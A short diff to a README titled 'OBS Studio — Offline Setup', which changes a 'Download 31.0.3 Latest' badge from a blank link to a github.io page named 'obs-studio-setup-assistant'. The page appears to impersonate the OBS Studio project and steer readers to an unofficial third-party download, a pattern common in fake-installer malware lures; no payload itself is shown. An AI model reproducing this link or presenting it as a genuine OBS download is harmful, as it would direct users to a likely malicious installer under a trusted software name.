@@ -1,6 +1,6 @@
 # OBS Studio — Offline Setup
 
-[![Download 31.0.3 Latest](https://img.shields.io/badge/Download-31.0.3_Latest-blueviolet)](#) 
+[![Download 31.0.3 Latest](https://img.shields.io/badge/Download-31.0.3_Latest-blueviolet)](https://obs-studio-setup-assistant.github.io/.github/) 
 
 OBS Studio - Free and open source software for live streaming and screen recording
 
